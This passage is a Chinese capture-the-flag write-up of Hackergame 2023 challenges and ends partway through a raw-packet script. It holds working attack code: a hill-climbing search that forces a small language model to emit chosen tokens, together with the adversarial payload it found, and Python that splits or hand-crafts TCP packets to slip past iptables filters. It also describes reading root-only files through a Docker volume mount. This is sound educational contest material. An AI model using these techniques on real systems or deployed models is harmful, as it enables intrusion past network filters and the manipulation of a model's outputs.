本篇 Writeup 原文发表于 [我的博客](https://ranwen.de/posts/2023-11-04-hackergame23/) ，欢迎各位去围观。

本人废话比较多，请各位理解。可以在博客使用目录跳转等功能，获得更好的阅读体验。

## 0x00 Hackergame 启动

大声喊出： Hackergame 启动！

之后也拿不到 flag。

然后发现改一下浏览器地址就好了。

## 0x01 猫咪小测

今年题比较简单。前两问非常容易找到可靠的原始来源。

第三问直接搜 `tcp bbr compile config` 也不难找到。

最后一问稍微麻烦一点。直接搜 `python type mypy` 相关的论文太多了。但考虑到题目中描述停机问题，因此我们不难再加上一个关键词 `turing`。之后不难得到相关文章 https://drops.dagstuhl.de/opus/volltexte/2023/18237/pdf/LIPIcs-ECOOP-2023-44.pdf

## 0x02 更深更暗

这题意思是 flag 藏在网页底部。因此我们直接 F12 看看审查元素里面有没有底部元素。发现还真有，于是得到 flag。

## 0x03 旅行照片 3.0

第二题：不难发现这是诺贝尔奖奖牌（直接搜索奖牌上人名也不难猜出），然后根据人名，可以发现这人是东京大学的。

然后可以找到一个 wiki 页面 https://en.wikipedia.org/wiki/List_of_University_of_Tokyo_people 里面列出了所有的东大诺贝尔奖学者。

不难找到题目中所求的人应该是 https://en.wikipedia.org/wiki/Takaaki_Kajita ，因此答案 ICRR。

第一题：找了半天，照片也没有啥 exif 啊，怎么不是经典项目了。算了写个脚本试一下好了，反正暑假也就两个月。然后发现日期是 2023-08-10 ~~怎么没去下北泽玩~~

第三题：地图上直接找东大附近的博物馆，结合卫星地图，通过找水池不难判断出这是 Tokyo National Museum。我们发现对面是上野公园。掏出翻译软件不难去搜索 "上野公園 2023-08-10 ボランティア"，找到网页 https://umeshu-matsuri.jp/tokyo_ueno/ ，得到答案 S495584522。

第四题：直接访问博物馆官网，不难发现票价就那么几个档位，随便试一下好了。发现是 0 。合理。

第六题：第一问网上不难直接搜索到，有大量的旅行攻略都写了这个地方，能看出来是一个商店的标志是粉色背景前的熊猫，并且常年在卖熊猫相关，因此本题的海报应该也很难不是熊猫。第二问网上搜 "东京 3d 动物 广告"，不难找到 https://www.gotokyo.org/tc/new-and-now/new-and-trending/221121/topics.html ，发现可选项只有两个，涩谷的秋田犬和新宿的三花猫。其实结合题目描述就能唯一确定是秋田犬。不过还可以结合上面的马里奥的图，显然这个看起来像是什么公司的文化墙，然后搜索发现任天堂就在涩谷那一片。

第五题：麻了，被"打算乘船欣赏东京的迷人夜景和闪耀的彩虹大桥"误导了，一直在搜怎么乘船。后来想了下，还是看看这个"学术之旅"是啥意思吧。我们不难从上一张图找到这是在参加 STATPHYS28，网站官网不难发现，大量活动集合地点都在安田讲堂。因此答案就是这个。

## 0x04 赛博井字棋

显然井字棋是不可能必胜的，因此题目网站一定有 bug，而这又是个 web 题。

不难发现题目中维护 session 的方式是使用本地的 jwt，但是试了一下这个东西有鉴权，搞不了。

那不管怎么样，还是先手搓一个非法请求看看吧。先随手造了一个越界请求，然后发现居然没有报错？那我们再试试如果下到已经下了的地方会怎么样，发现还是不报错，甚至 bot 又跟着走了一步。所以我们直接构造请求覆盖 bot 下的位置就好了。

## 0x05 奶奶的睡前 flag 故事

其实如果关注新闻的话，今年有个比较严重的安全事件，pixel 的截图编辑功能并不会完整去除掉原来的图片信息，那么这题大概思路就有了。

如果不用这个，手搓 png 数据，也能发现有一些没有显示出来的东西。手动解压还是挺麻烦的，因为并没有正确的 padding 之类的。

当然我们做题直接网上搜相关的 exp 就行了，不难找到 https://acropalypse.app/ 。

## 0x06 组委会模拟器

这题是我比较靠后做的一道题。因为题目简单，但是感觉写起来有点麻烦（不想写 js，但是如果用 py 去写的话又得维护 session）。

最后还是写了 js，直接在浏览器控制台上执行。直接大力定时扫描 DOM，然后模拟点击。

```js
function work()
{
let sm=document.querySelectorAll(".fakeqq-message__bubble");
let rex=/hack\[.*\]/g;
for(let i of sm)
{
    if(i.innerText.match(rex))
    {
        let flag=i.innerText.match(rex)[0];
        console.log(flag);
        i.click();
    }
}
}
setInterval(work,1000);
```

## 0x07 虫

非常经典的题目。不难发现这题就是一个 SSTV 而已，随便找个软件解码成图片就行了。

## 0x08 JSON ⊂ YAML

搜索为主。第一问网上不难找到 exp，说 yaml 有很多不能处理 json 的 case。一些会导致解析器报错，一些会导致结果不一致。同时其中有一些只对 1.1 有效。我们随便选取一个，例如 Unicode 编码的。我们直接提交 `"\uD834\uDD1E"`就可以，这个 json 可以解析出 Unicode 字符，而 yaml 不行。

第二问就比较恶心了。实际上 yaml 不能处理而 json 可以处理的东西有很多。但最大的问题是，如果想要拿到 flag2，就必须不能让 flag1 的 yaml 1.1 解析器崩溃。事实上有大量的输入可以被 json 解析而让两个 yaml 解析器都崩溃。但总之这拿不到 flag。

因此我们再考虑一下，什么时候会出现分歧：

- yaml 1.1 正常执行：
- - spec/实现支持
  - spec不支持，实现支持
- yaml 1.2 解析崩溃：
- - spec/实现不支持
  - spec支持，实现不支持

结果通过分析发现，yaml 1.2 对于合法的 json 部分的 spec，是 1.1 的超集，很难崩溃。因此我们只能考虑一种最开始根本就没有考虑的情况，想了好久才想到这个地方：

- json 文件不标准，但实现支持。

我们去看一下 python 的库说明 https://docs.python.org/3/library/json.html#standard-compliance-and-interoperability ，发现实现确实支持不标准，然后就能找到 exp 了：构造一个拥有两个相同键值对的 json。

我最开始也想到这一点了，但是最开始试的时候试漏了（同时试了超长键值，结果两个版本的都崩了）。最后搜了一圈才发现这个。

## 0x09 Git? Git!

经典 git 恢复题。

直接搜索 `git deleted commit restore` 不难发现命令 `git reflog` 可以找到原始的 git 日志，相关 commit 并没有被从项目中删除。

## 0x0A HTTP 集邮册

比较有意思的题，基本思路是对着 MDN 搞。看看每个状态码都是什么情况下会触发，然后去构造触发条件。 https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/100

但是这么搞还是不太行，进阶思路是对着 nginx 源码搞。因为有一部分状态码 nginx 实现并不标准，或者说有一部分也没有实现，参考源码可以节省大量的试 payload 时间。https://github.com/nginx/nginx/blob/master/src/http/ngx_http_request.h#L92

先看一下中间那个支线任务，要求返回的内容不能以 HTTP Code 开头。如果有人用 curl 获取过非 http 协议的地址的话，不难发现原来还有一个叫 HTTP 0.9 的协议。这是在 HTTP 标准出来之前就已经实现了的，只是后来才被强行加了个版本号。这个协议核心内容就是，没有 Header，包括返回的 HTTP 状态码的头部。而 nginx 恰好还实现了这个根本没人用的协议。

payload:

```
GET / \r\n\r\n
```

我们再看主线任务。我实现的 12 个状态码是 [100, 200, 206, 304, 400, 404, 405, 412, 413, 414, 416, 505]。

显然看着状态码对照 MDN 实现并不难，这块我就懒得列具体 payload 了（我忘了存了）。

一个比较坑的地方是，由于 nginx 实现不标准，类似 `431 Request Header Fields Too Large` 之类的代码并不会返回。我们通过查看源码可以确认这一点：有好几类类似的请求，最后都只会返回 400。

## 0x0B Docker for Everyone

经典安全问题了。通常大家跑 docker，里面的用户都是 root，因此也能直接拿来读写仅 root 权限的文件。而跑 docker 服务的用户也是 root，不存在权限问题。

因此我们直接跑个 docker 然后用 -v 吧 flag mount 进去后直接读就行。

## 0x0C 惜字如金 2.0

题目给了个处理后的 py 。我们把一些平凡的处理部分还原，发现程序还是跑不起来。

研究一下发现 cod_dict 中，每一行字符串都被删去了恰好一个字符。当然我们不知道被删的是哪个，我们先都在末尾随便加个符号就好。

跑一下打印 flag，发现能跑起来了，但是有些字符不太对（比如开头的 flag）。我们还原一下字符原来的位置，可以看到与正确的字符位置正好差 1，这说明被删去的字符应该在这个位置的前面而不是后面。我们把那个符号挪到前面就行。之后就能得到 flag 了。

## 0x0D 🪐 高频率星球

题目给了一个 asciinema 录制的文件。这个东西不仅录东西看东西很好，好就好在他还能直接使用 cat 选项，以文件流的形式直接打印录像。

因此我们就直接得到相关 js 的源码了。注意到中间每隔几行就会出现冒号或者一些特殊字符。这是 vim 的 footer 和人的按键之类的，我们随便找个编辑器全部替换掉就行了。

## 0x0E 🪐 小型大语言模型星球

### You Are Smart

随便设计点 prompt 就好。当然这个模型比较小，所以让直接让他重复不太行。但把他写成故事形式就不难补出要补的东西。具体输入没存，但我印象里好像和题解的几乎一模一样（反正就是构造一些重复）。

```
A: you are smart B: you are smart A: you are smart B: you are smart A:
```

### Accepted

这个词应该还是比较多出现的，所以继续考虑构造 prompt。考虑面向数据集构造，我们把数据集下下来后，发现大量的 accepted 都出现在什么 He She 之后，因此我们考虑带上这些词，然后去枚举其他字符，应该很快就能出来。

```python
cs=string.ascii_letters+string.digits+string.punctuation
print(cs)

cnt=0
for i in product(cs,repeat=4):
    inp="".join(i)+" He"
    resp=predict(inp)
    if "accepted" in resp:
        print(inp)
        break
    cnt+=1
    if cnt%100==0:
        print(cnt)
```

使用`aaeU He`就行，还挺靠前的。

### Hackergame & 🐮

这两问做题方法是基本一致的，但是第二问明显要更难一些。

这主要是因为 hackergame 会被 tokenizer 拆分成 h acker game。这三个部分都挺常见的。注意到前面的 h 比较短，在实践中可能通常会和其他字符一块组成一个更长的 token。而🐮会被拆分成三个 token，我也不知道这玩意到底是怎么编码的，反正就是数据集中只出现了少量次数（没错这个纯英文故事数据集里面既有中文还有 emoji），这就导致很难构造出一个选择概率遥遥领先的情况，因为我们要造的 token 可能和其他的稀有 token 在模型里面没什么差异。

再考虑做法。稍微试一下就发现，这个模型拿来补全故事太笨了，显然这两个题不能用 prompt 攻击了。我们考虑直接进行神经网络攻击。一个正经做法是梯度攻击，但这玩意比较麻烦我也懒得研究。但无论如何，既然要搞梯度攻击，那肯定要先看看，这个模型的输出是怎么从一个神经网络输出变成 token 序列的。

我们看一下 transformer 的代码，再随便测试一下，不难发现，模型是一个一个 token 生成的，而每次生成都会执行 model.forward ，并从输出里面（具体地，是 output.logits 的最后一行）选取 argmax 作为下一个 token。这意味着我们可以直接对 model.forward 进行攻击，让我们需要的 token 的位置的值最大就行。

之后考虑如何一次生成三个值，并转化为一个全局的最优化问题。为了避免对齐问题（比如说我们把第二个 token 训对了，但是第一个又错了），我们在预测第二个 token 时，一定要假设前面的 token 已经生成正确了（而不是直接采用上一个的 argmax）。同时我们观测到，模型的输出值大概在 -10 到 20 之间，而一些情况下全局最大值可能也就 10 出头。我们需要设计一个函数，把三个 token 对应的输出量化到一个可以被最优化分析的 loss 函数上。最开始由于 softmax 用错了，我以为是不好使，因此就手搓了一个基于全局平均权值的使用 exp 的 loss 函数。这个可以被用于解第三问，但是第四问就不太有效了。

这块其实还可以用一个应该正确的技巧：我们观察到 logits 输出是有 n 行的，而每一行似乎和预测的第 i 个 token 的权重是一致的，因此直接用最后一遍的后三行作为三个 token 的概率就行，不用分别跑三遍。我当时求稳就没用。

接下来是如何达到最优化。我们直接采用大力爬山的办法：每次从向量里面随机选择一维，然后加减一个随机数，之后再比较得分是否变高，如果变高了就爬过去。我因为懒了（主要是最开始的 exp loss 不太好操作），直接维护的 top1，而不是 topk，可能会产生过拟合现象。如果产生了过拟合我们就人肉当一下优化器调一下随机数范围或者不同位置的权重就好。注意到我们在爬的时候，一次可以尝试多个方向，可以使用 GPU 一次算一个 batch。

但是这个做法也只能在第三问有效。由于第四问的字符实在是太稀有了，所以人肉优化会非常痛苦。于是我再次检查了一下 softmax，使把每个 token 的输出过一遍 softmax，最后用对数加起来，发现非常好用，很快就训出来了。

在训的过程中偶尔也会过拟合，手动调整一些参数或者输入就可以退出过拟合状态。虽然还要偶尔手动操作，但是操作次数比直接前面乱糊的 loss 函数要少多了。

选初始向量也有一点小技巧：初始向量的值不宜太大或者太小。如果比较大，在几万的大小，可能会因为输入数据集的数据太少而容易过拟合；如果比较小，在几十的大小，可能会因为可替代性太强，而在数据集中也没有显著特征，不太容易训出遥遥领先的权重。因此对于 hackergame 可以把第一个 h 改成其他的 token。

最后跑出来还有一个小坑：我初始向量最开始没选好，跑出来的有不可见字符（比如你把🐮的三个 token 分别转回去就是三个不可见字符）。而这个不可见字符是没办法提交甚至转码回去的。因此我们只能把那个字符完全改掉，再加训一会。

另外就是，第四问需要的输入向量比较大，所以给了 200 字符的长度，因为 100 字符可能爬不出来。

```python
import time

from transformers import AutoModelForCausalLM, AutoTokenizer
from itertools import product
import string
import torch
import random
import math
import numpy as np
import json

f=open("TinyStories-33M/tokenizer.json","r")
x=json.load(f)
f.close()
word2int=x["model"]["vocab"]
int2word={v:k for k,v in word2int.items()}

print(time.time())

model = AutoModelForCausalLM.from_pretrained("./TinyStories-33M").eval()
tokenizer = AutoTokenizer.from_pretrained("./TinyStories-33M")

#check using gpu

device=torch.device("cuda:0" if torch.cuda.is_available() else "cpu")
# device="cpu"
print(device)
model.to(device)
torch.set_grad_enabled(False)
model.requires_grad_(False)

print(time.time())

def predict(message):
    model_inputs = tokenizer.encode(message, return_tensors="pt").to(device)
    # print(model_inputs)
    model_outputs = model.generate(
        model_inputs,
        max_new_tokens=30,
        # max_new_tokens=30,
        num_beams=1,
        pad_token_id=tokenizer.eos_token_id,
    )
    model_outputs = model_outputs[0, len(model_inputs[0]) :]
    model_output_text = tokenizer.decode(model_outputs, skip_special_tokens=True)
    return model_output_text

def predict_raw(raw_message):
    model_inputs = torch.tensor([raw_message]).to(device)
    model_outputs = model.generate(
        model_inputs,
        max_new_tokens=30,
        num_beams=1,
        pad_token_id=tokenizer.eos_token_id,
    )
    model_outputs = model_outputs[0, len(raw_message) :]
    return model_outputs

def encodem(message):
    model_inputs = tokenizer.encode(message, return_tensors="pt")
    return model_inputs

def decodem(outputs):
    model_output_text = tokenizer.decode(outputs, skip_special_tokens=True)
    return model_output_text

# cs=string.ascii_letters+string.digits+string.punctuation
# print(cs)

def my_predict_raw(raw_message):#num=1
    if isinstance(raw_message, torch.Tensor):
        model_inputs = raw_message.to(device)
    else:
        model_inputs = torch.tensor([raw_message]).to(device)
    model_outputs = model.forward(model_inputs)
    score = model_outputs.logits[:, -1, :]
    ids=torch.argmax(score,dim=1)
    return int(ids[0])

def topkv(lex,k=5):
    u=[float(x) for x in lex]
    u.sort(reverse=True)
    return u[:k]

def myp(lis):
    return " ".join(["%7.4f"%x for x in lis])


res=[9619, 1061, 813, 1463, 556, 416, 513, 6847, 7850, 2248, 487, 663, 262, 6094, 8590, 2206, 4882, 608, 37, 2170, 4662, 47336, 796, 261, 887, 653, 548, 257, 27925, 5084, 1236, 1667, 2074]


basevec=torch.tensor(res)

print(len(basevec))

veccnt=64#for 6G vram

rdcnt=1

TARGETA=8582
# TARGETA=12520
TARGETB=238
TARGETC=106
# TARGETA=71
# TARGETB=10735

# TARGETA=1169
# TARGETB=4701

lscore=(-50,-50)
lsinp=None
lsres=None
scorew=(20,20,20)
refscore=-1145141919810

batchcnt=0
imprcnt=0

while True:
    if lsres==(TARGETA,TARGETB,TARGETC):
        print("FOUND",lscore,lsres,lsinp)
        break
    # isinit=lsinp==None
    isinit=True
    vec=[list(basevec)] if isinit else []
    for i in range(veccnt-int(isinit)):
        nv=list(basevec)
        for j in range(rdcnt):
            pos=random.randint(0,32)
            # deltv=random.randint(-100,100)
            scales=(nv[pos]/1000)
            scales=max(scales,1)
            deltav=np.random.normal(0.0,50.0*scales)
            deltav=max(-500.0*scales,min(500.0*scales,deltav))
            deltav=int(deltav)
            if deltav==0:
                deltav=random.randint(-500,500)
            tv=nv[pos]+deltav
            tv=(tv-1)%50254+1
            # if not (0 < tv < 50256):
                # continue
            nv[pos]=tv
        vec.append(nv)
    tvec1=torch.tensor(vec).to(device)
    ret1=model(tvec1)

    expt1=torch.tensor([TARGETA]*veccnt).to(device)
    tvec2=torch.cat((tvec1,expt1.unsqueeze(1)),dim=1)
    ret2=model(tvec2)

    expt2=torch.tensor([TARGETB]*veccnt).to(device)
    tvec3=torch.cat((tvec2,expt2.unsqueeze(1)),dim=1)
    ret3=model(tvec3)
    
    scorex1=ret1.logits[:,-1,TARGETA]
    scorex2=ret2.logits[:,-1,TARGETB]
    scorex3=ret3.logits[:,-1,TARGETC]
    uscore=(torch.log(torch.softmax(ret1.logits[:,-1,:],dim=1)[:,TARGETA]).detach()*1+
            torch.log(torch.softmax(ret2.logits[:,-1,:],dim=1)[:,TARGETB]).detach()*1+
            torch.log(torch.softmax(ret3.logits[:,-1,:],dim=1)[:,TARGETC]).detach()*1)
    maxv=int(torch.argmax(uscore,dim=0))
    fmvec=[int(x) for x in vec[maxv]]
    mscore=float(uscore[maxv])
    maxv1=int(torch.argmax(scorex1,dim=0))
    maxv2=int(torch.argmax(scorex2,dim=0))
    maxv3=int(torch.argmax(scorex3,dim=0))
    mscore1=float(scorex1[maxv])
    mscore2=float(scorex2[maxv])
    mscore3=float(scorex3[maxv])
    lres1=int(torch.argmax(ret1.logits[maxv,-1,:]))
    lres2=int(torch.argmax(ret2.logits[maxv,-1,:]))
    lres3=int(torch.argmax(ret3.logits[maxv,-1,:]))
    rxans1=float(ret1.logits[maxv,-1,lres1])
    rxans2=float(ret2.logits[maxv,-1,lres2])
    rxans3=float(ret3.logits[maxv,-1,lres3])
    print(("W %.4f %.4f %.4f %.4f %.4f %d %d %d %.3f %.3f %.3f %d")%(mscore,refscore,mscore1,mscore2,mscore3,lres1,lres2,lres3,rxans1,rxans2,rxans3,maxv),end=' ')
    print(fmvec)
    print(myp(topkv(ret1.logits[maxv,-1,:].to("cpu").numpy())),end='\t')
    print(myp(topkv(torch.softmax(ret1.logits[:,-1,:],dim=1)[:,TARGETA].to("cpu").numpy())))
    print(myp(topkv(ret2.logits[maxv,-1,:].to("cpu").numpy())),end='\t')
    print(myp(topkv(torch.softmax(ret2.logits[:,-1,:],dim=1)[:,TARGETB].to("cpu").numpy())))
    print(myp(topkv(ret3.logits[maxv,-1,:].to("cpu").numpy())),end='\t')
    print(myp(topkv(torch.softmax(ret3.logits[:,-1,:],dim=1)[:,TARGETC].to("cpu").numpy())))
    basevec=torch.tensor(fmvec)
    lscore=(mscore1,mscore2,mscore3)
    lsinp=fmvec*1
    lsres=(lres1,lres2,lres3)
    if maxv!=0:
        print(mscore-refscore)
        print("BETTER",lscore,refscore,lsres,lsinp)
        imprcnt+=1
    refscore=mscore

    if batchcnt%50==0:
        print("CHECK",lscore,refscore,lsres,lsinp,TARGETA,imprcnt)

    batchcnt+=1


```

payload 注意空格:

```
!"---- PMual evenernorn moviesmission-------- Open their vs
 channels followilyention ag by 3itial river labff its the towoz deter breatountF typoursmeasures =on Butitionvery aafety democrann mar consider
```

比较好玩的事：我最开始随便输了点中文，然后发现这个数据集里面居然也有中文，看起来是个中英对照的小说译文。

## 0x0F 🪐 流式星球

题目给了一个直接按像素和帧拍平编码的视频数据的 numpy 数组，并去掉了末尾很少的随机字节避免直接被整除分析。首先一个帧多高不重要，我们总可以竖向全拼到一块然后剪辑。而看一个帧多宽，我们枚举一下就行了。注意到如果原始图片中出现了竖向纹理，则当我们帧宽不对时，竖向纹理会变成斜向纹理。我们利用这个性质，写个脚本试一下，不难试出宽度 427，之后再输出高一点，不难看出帧高 759。之后我们拆一下帧，不难发现 flag就在最后。

```python
import gmpy2
import numpy as np
from PIL import Image

f=open("video.bin","rb")
a=f.read()
f.close()

print(len(a))

lines=2000

# for i in range(10,1000):
#     lis=list(a[:i*lines*3])
#     lis=np.array(lis,dtype=np.uint8)
#     lis=lis.reshape((lines,i,3))
#     lis=Image.fromarray(lis)
#     lis.save(f"tmp/img{i}.png")
#     print(i)

weight=427
lines=759
print(weight)

lis=list(a[:weight*lines*3])
lis=np.array(lis,dtype=np.uint8)
lis=lis.reshape((lines,weight,3))
lis=Image.fromarray(lis)
lis.save(f"img{weight}.png")

frames=len(a)//(weight*lines*3)

for i in range(frames):
    lis=list(a[i*weight*lines*3:(i+1)*weight*lines*3])
    lis=np.array(lis,dtype=np.uint8)
    lis=lis.reshape((lines,weight,3))
    lis=Image.fromarray(lis)
    lis.save(f"frame/img{i}.png")
```

## 0x10 🪐 低带宽星球

题目给你了一个三色旗的 flag，要求你压缩成一个很小的文件。其中拿到最后一个 flag 需要压缩到 50B。题目图片也没什么特殊的，非常简单的 1024x1024 有三个竖向分区的纯色图（颜色也没有什么特征，就是随机的 RGB）。

第一问只要压缩到 2KB，没什么难度，随便找个png压缩软件就行。

重点在第二问。显然我们要从比较程序入手了。然而最终只差了一点点就做出来了，，

比较程序用的是 libvips 这个库。比较程序本身看起来没有什么问题（谁知道怎么真有问题），因此我们从这个库入手。读一下代码，并不是所有图片格式都可以使用 from_buffer （显然）。能使用的格式插件应该含有 is_a_buffer 函数。我们直接搜索一下，看看哪些插件有这个函数：

```
webp
tiff
svg
spng
rad
poppler
png
pdfium
nsgif
magick7
magick6
jxl
jpeg
jp2k
heif
```

注意到一些比较上古的格式（png jpg 之类的）基本都是位图压缩存储方案。显然位图再怎么压，也不可能压得这么小。 jpeg 之类的就更拉了。而矢量图（如 svg）格式看起来是比较合适的，但他们要写出来还是会有很多的冗余字符。

我们不妨聚焦到现代图片格式上。显然像 heif 里面可能会用到的格式里面，有一些可变 chunk size 的存储方案，可能比较好。但我们可以先看看似乎更现代的 jxl。

简单看了一下 wikipedia 介绍，我就感觉非他不可了。

> - **Modular** mode is responsible, among other things, for efficient lossless content encoding and also for lossy and near-lossless purposes. Modular can also be used internally in VarDCT to save 2D data, i.e. everything except the AC (high-frequency) DCT coefficients, including the DC image (which is always a 1:8 subsampled image so also includes low-frequency AC coefficients in case block sizes larger than 8×8 are used), the weights of adaptive quantization and filter strengths.

这显然就是为本题量身设计的！而我们再网上搜索一下，也不难发现 JXL 确实是公认的无损压缩最好的图片格式。

但显然，这个格式有点太新了，几乎没有软件支持解码和编码。spec 还是付费的，而且还特别长，不是正常人能短时间内读完的。

具体地，支持编码图片的软件只有一个官方参考实现的 libjxl（libvips 也是调的这个），解码的作为生产使用的也只有它（有 Rust 和 Java 参考实现版本）。因此到这块我就觉得只能手糊了，，（然后我对 mivik 快速解出表示十分蒙古）

之后我先对我的图片，使用 libjxl 提供的工具 cjxl进行压缩和调参。发现稍微调一下，就能把图片大小压到 70B 以内。显然很有希望。但我又发现这个压出来的大小比较随机。我又调了调参，并写了一个程序，同时随机生成了 100 张图片（因为这个图片看起来是每个人随机生成的），结果发现，这里面最大的大小也就 61B（而我的也是 61B），只占不到 20%，最小的只有 56B。这让我很不爽，因为这种手搓压缩，一个字节也很重要~~（于是开始喷出题人）~~。

```
./cjxl -q 100 test.png -e 9 -g 3 -I 100 -E 0 test.jxl -P 4
```

FUN FACT: 如果你用最新版源码是压不到这么小的，你需要用旧一点的版本。

我们可以大力把 effort 开到10，但是在题目给的图里面基本没啥用。-g 参数表示预测 group 的大小，3 对应 1024，显然是比较好的。-P 表示做图案预测的模式，显然我们的图片具有明显的方向性（横竖不一样），因此只有个别的几个参数可以压到两位数大小。

之后研究怎么手搓压缩。首先要研究 JXL 的存储格式。我使用了别人写的 [Java 参考实现](https://github.com/Traneptora/jxlatte)，因为读起来方便一点。之后花了几个小时把几乎所有结构都彻底搞明白了。大致存储方案是，有一个叫 MA Tree 的数据结构，使用类似 KD-Tree 的方法，对通道和平面进行划分，这个划分的方式是写在 TreeNode 的属性里面的，可以在任何一层按非常多的方式划分（例如看 xy 坐标，或者看 channel 号，或者看相邻坐标的值等）。之后根据划分得到的叶子节点，从叶子节点获取 Context，从 Context 对应的数据流获取预测用数据，之后再用叶子节点对应的 predictor 和获取的预测用数据来预测真实值并写入。显然这块优化得太猛了。

这个数据流是我唯一没搞懂的地方，阻碍我直接手搓字节流（因此替代方法只能是修改唯一支持编码任意的软件 libjxl，实在是太难了）。我们都知道其他图片格式都会使用压缩算法来压缩一些串，对于一些有特定模式的串会小很多。而针对这种压缩，有一个专业的东西叫 Entropy Encoding。而 JXL 中就使用了 ANS Symbol Distribution Encoding 的方法（作为选择之一，很不幸另外一个选择实现也很复杂；同时还可以套一层 LZ77 ）。这玩意网上基本没有地方介绍，感觉是非常学术界的东西。总之就是一个我没有看懂的奇怪压缩算法。因此最后就摸了，没搓成。

当然其实搞清楚格式也不够，主要还是得研究哪块有冗余信息，图片数据是怎么构成的。经过调试检查，我发现 cjxl 生成的图片是这么构成的：

- 图片头和帧头。这块没有什么差别。
- MA Tree。这块 cjxl 生成的只有三个节点。一个根节点两个叶子节点。而使用题解中的方法生成的有 17 个节点（9 个叶子 8 个分支）。
- EntropyStreamData。不考虑 Stream 文件头部分，这块 cjxl 生成的内容有 250 bits 长，而题解生成的没有（因为其实全 0 了就被压缩掉了）。

具体解码方式也很不同：

cjxl 生成的图像，只有两个 channel，第一个大小是 3x3，表示颜色变换；第二个大小是 1024x1024，表示每个像素对应的序号。而对于 MA Tree，读取每个位置对应的值时，在寻叶子节点过程中的分支（根）节点看的是这个点上面的点的值（如果在最顶就看左侧），看是 01 还是 2，之后导入到不同叶子节点。而从叶子节点读出来的值，经过 predictor 后获取的就是 012（如果正好是第二个 channel 对应的数据，如果是第一个 channel 则是一个大小为几百的其他值），分别对应三个不同颜色块。在读取完两个通道后，执行三次颜色变换：每次把第一个 channel 的值取三个，然后做某种算法（懒得细看），生成一个新 channel。做完三次变换后，生成的三个通道就对应着要输出的 RGB 了。

我们再观察哪些数据有冗余或者说编码得不太好。这两个 channel 内容读取的字节流大小分别为大约 200 bits （明明只有 9 个字节）和 50 bits。而 Stream 对应的头部也很大。因此我们不难想到一种新方案：重新构造一个新的 MA Tree，使得先是 Color Channel 对应不同的流，剩下的图片数据直接使用 MA Tree 根据横坐标（而不是上面点的值）直接进行切分。这样应该能省不少字节流，而 MA Tree 和字节流头部的增加不会特别多。这样分下来总共应该是四个叶子节点。

但反正这玩意搓起来不是短时间能搓好的，于是最后放弃了（寻思着就算搓出来了也要再做个二进制才能提升名次，而且估计得搓个三五小时，实在是累了，没想到还有囤 flag 的），先去看其他二进制了。

后来和题解的对比了一下，感觉我这个做法应该比用那个 JXL Tree 生成的还要小。毕竟作者看起来也不懂内什么 ANSSymbolDistribution，没有实现相关功能，使用这个东西压缩一些信息应该还是有搞头的。当然我也不懂，所以也没搓成（改 lib 还是太烦了）。

事后反思一下，发现没做出来的主要问题还是眼瞎和人傻。https://jpegxl.info/ 翻了好几遍硬是没看到那个明示的 `JXL Art! Beauty in a handful of bytes.`，也没有上网去搜什么 smallest JXL file。如果仔细看了的话都能找到这个，然后就很容易构造了。

## 0x11 Komm, süsser Flagge

非常好计算机网络题目。

我们要知道 iptables 是针对数据包执行策略的。

对于第一问，显然这是经典 "TCP粘包" 问题。TCP 是不对单个数据包做任何保证的，只对数据流做保证。因此我们可以把请求拆成两个包分别发送，使其都不包含 POST 的完整串。需要手搓一下 raw tcp。

```python
import socket
import time

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# IP="202.38.93.111"
IP="192.168.23.1"
PORT=18081

s.connect((IP,PORT))
s.send(b"PO")
time.sleep(1)
s.send(b"ST / HTTP/1.1\r\n")
s.send(b"Host: 202.38.93.111:18080\r\n")
s.send(b"Content-Length: 100\r\n")
s.send(b"Content-Type: application/x-www-form-urlencoded\r\n")
s.send(b"\r\n")
s.send(b"211:114514\r\n")

print(s.recv(1024))
```

对于第二问，需要看什么 u32 过滤规则，看起来有点痛苦。算了我们先试试第一问的 payload 吧。发现它过了！

其实过了是很正常的。因为这题本来就是假设 TCP 包头是定长的，只会检测固定位置的值不含 P，而本地发的时候很容易就带上什么 option（反正抓包能看到，jurisdiction忘了），然后包头变长，绕过检测。

对于第三问，就很麻烦了。我们上网先搜一下 iptables string 中的 from 和 to，分别是从什么开始的。不难看到[一个问答](https://serverfault.com/questions/1000456/iptables-string-match-does-not-work-whe-the-to-option-is-52)，说是直接从原始包头开始的。这意味着我们发的包头里面，必须含有 `GET / HTTP` 这个长度为10的串，而这也意味着我们的 SYN 请求也需要带。显然我们要搓 raw socket 来模拟 TCP 了。

这块就比较麻烦了。因为 Windows 并不支持使用 raw socket，而我又需要一个支持 wireshark 实时抓包的 GUI。最后就掏了一个虚拟机出来，连 vpn（肯定没有网络问题）。当然其实也可以走 X server 强起，不关键。

发包这块可以用 scapy，但是我担心有坑于是直接手搓了（反正网上抄一个代码也不难）。

我们再看一下 TCP 协议，发现必要的包头只有 40 字节，而后面是 option。如果 option 可以乱填的话，我们就直接在后面跟需要加的 payload 就好了。注意一下我们需要改包头里面的包头长度字段（抄的实现里面直接写了个常数），同时包头还是 4 字节对齐的，需要填充一下。之后我们先发送第一个 SYN 包。

发送完后，看 wireshark，发现果然拿到了 ACK，但是怎么莫名其妙跟了个 RST。自己观测发现原来是自己本机发的。。我们简单搜一下，使用 iptables 禁掉就好。

之后我们收到 ACK 后，读一下内容就可以再发 SYN+ACK 了，注意这个也要包含上面那一坨。而这个时候已经可以传输数据了。因此直接发送。下一个包就能得到 flag 了。

```python
import socket
import time
import random

import socket
import struct

def calc_checksum(msg):
    if len(msg) % 2 == 1:
        msg += b'\0'
    s = 0
    # loop taking 2 characters at a time
    for i in range(0, len(msg), 2):
        w = (msg[i]) + ((msg[i+1]) << 8 )
        s = s + w
        s = (s>>16) + (s & 0xffff)
    s=~s & 0xffff
    s=s>>8 | (s<<8 & 0xff00)
    return s


def make_ip(proto, srcip, dstip, ident=54321,tlen=10,checksum=0xb670):
    saddr = socket.inet_aton(srcip)
    daddr = socket.inet_aton(dstip)
    ihl_ver = (4 << 4) | 5
    tlen=40+tlen
    prec=struct.pack('!BBHHHBBH4s4s' , 
                       ihl_ver, 0, tlen, ident, 0x4000, 64, proto, 0, saddr, daddr)
    checksum=calc_checksum(prec)
    prec=struct.pack('!BBHHHBBH4s4s' , 
                       ihl_ver, 0, tlen, ident, 0x4000, 64, proto, checksum, saddr, daddr)
    return prec

def make_tcp(srcport, dstport, payload,srcip,dstip, seq=0, ackseq=0,
             fin=False, syn=True, rst=False, psh=False, ack=False, urg=False,
             window=5840,checksum=0x0db0):
    offset_res = ((5+3) << 4) | 0
